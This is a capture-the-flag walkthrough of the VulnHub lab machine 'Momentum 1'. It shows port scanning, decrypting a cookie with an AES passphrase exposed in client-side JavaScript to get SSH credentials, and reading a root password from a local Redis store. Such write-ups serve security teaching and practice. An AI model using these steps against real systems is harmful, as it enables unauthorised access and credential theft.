# [Momentum 1](https://www.vulnhub.com/entry/momentum-1,685/)

We start off with `nmap`

```
# Nmap 7.92 scan initiated Tue Sep  7 12:33:25 2021 as: nmap -vvv -p 22,80 -sCV -oA init 192.168.1.14
Nmap scan report for box.ip (192.168.1.14)
Host is up, received syn-ack (0.00020s latency).
Scanned at 2021-09-07 12:33:26 +07 for 6s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 5c:8e:2c:cc:c1:b0:3e:7c:0e:22:34:d8:60:31:4e:62 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgY+ZHfSI8n4CS/wRyjcub7cHXCF/Lg9B1V5/ON1L6cGSGi/d2UZI7DBzQ+HFfbDAHaXC+LCAd1YP+DUMBZTFeXq92YvaBgdMKqwSPUV3xjwdjZ4CxtFFlBOmm+7FV3RiJTqMqyuHrMtm8HyCy6qCGspg7N68GrtqKjx4hpVV1g83OejNgndSX8lFFicAUgyyITwTFNmORt1Q1gRsCrlyIsgBmKFA5ILdc368qfQ1wkl5UuQIywCR5tBocCr9wjz/Kmnw2vL9nVkz7Rpgoy+PpauO79oT3KNJCY14Na3HlIMkfHFDgAah2faQ+KfZ6iwHEBhUCc/Ntf73/hvNLhvMJ
|   256 81:fd:c6:4c:5a:50:0a:27:ea:83:38:64:b9:8b:bd:c1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAvETSAbSxSsiZsuMSlYBMPl4mnydOMukiWu7qTYt5jU7pkBdEyF1bT2MUBPAHf2Yr7LKAnmTUwmG8d3fPwK0A0=
|   256 c1:8f:87:c1:52:09:27:60:5f:2e:2d:e0:08:03:72:c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDyxkKiZS8Udvbmkf2wuWsUyotMD+/KKuHKbFTKRcttA
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Momentum | Index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  7 12:33:32 2021 -- 1 IP address (1 host up) scanned in 6.64 seconds
```

We have a web service on port 80 so we run `gobuster` on it.

```
/css                  (Status: 200) [Size: 931]
/manual               (Status: 200) [Size: 626]
/js                   (Status: 200) [Size: 928]
/img                  (Status: 200) [Size: 1495]
/server-status        (Status: 403) [Size: 277]
```

Nothing special here. Interacting with the web page, clicking on an image and clicking again on the enlarged image gives us a URL as follows

```
http://192.168.1.14/opus-details.php?id=guard
```

This looks like a possible LFI. However, if we go on to view the image in another tab, we see that the image names are not the same as what's provided in the `id` parameter and are instead files like `/img/c.jpg`. Just to be sure, I checked for LFI but that doesn't work. We do, however, have a cookie on this page (and not on the `/` page).

```js
>>> document.cookie
"cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt"
```

We don't know what that cookie is, however, so we note it for later.

Looking at the page source code, we have a JS file: `/js/main.js`. Looking at this file, we have an encryption key.

```js
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
console.log(decrypted.toString(CryptoJS.enc.Utf8));
```

Looking back at the cookie from `opus-details.php`, we can try decrypting the cookie, so I made an HTML file for just that.

```html
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>
  <script>
    var encrypted = "U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt";
    var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
    console.log(decrypted.toString(CryptoJS.enc.Utf8));
  </script>
```

With this, we should have `auxerre-alienum##` as the decrypted value. Doesn't look like a URL, so we try logging into SSH with it. We should be able to log in with the credentials `auxerre:auxerre-alienum##`.

Looking at listening ports ...

```sh
auxerre@Momentum:/tmp$ ss -tlnp
State          Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port
LISTEN         0               128                          127.0.0.1:6379                        0.0.0.0:*
LISTEN         0               128                            0.0.0.0:22                          0.0.0.0:*
LISTEN         0               128                              [::1]:6379                           [::]:*
LISTEN         0               128                                  *:80                                *:*
LISTEN         0               128                               [::]:22                             [::]:*
```

We see something's listening on port 6379. Checking with `ps` ...

```sh
auxerre@Momentum:/tmp$ ps aux | grep 6379
redis      435  0.0  0.4  51672  9544 ?        Ssl  01:28   0:03 /usr/bin/redis-server 127.0.0.1:6379
```

We see that `redis` is running. We have `redis-cli` on the machine so we can use that to enumerate redis.

```
127.0.0.1:6379> KEYS *
1) "rootpass"
127.0.0.1:6379> GET rootpass
"m0mentum-al1enum##"
```

We have a password for root. With this, we can `su` and become root.
